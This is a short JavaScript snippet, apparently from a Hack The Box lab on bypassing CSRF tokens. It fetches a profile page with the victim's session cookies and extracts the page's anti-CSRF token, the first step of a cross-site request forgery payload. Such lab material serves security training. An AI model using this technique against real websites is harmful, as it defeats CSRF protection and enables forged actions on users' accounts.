// GET CSRF token
const res = await fetch('https://bypassing-csrftokens.htb/profile.php', {
  credentials: 'include'
});
const text = await res.text();
const doc = new DOMParser().parseFromString(text, 'text/html');
const csrftoken = encodeURIComponent(doc.getElementById('csrf').value);
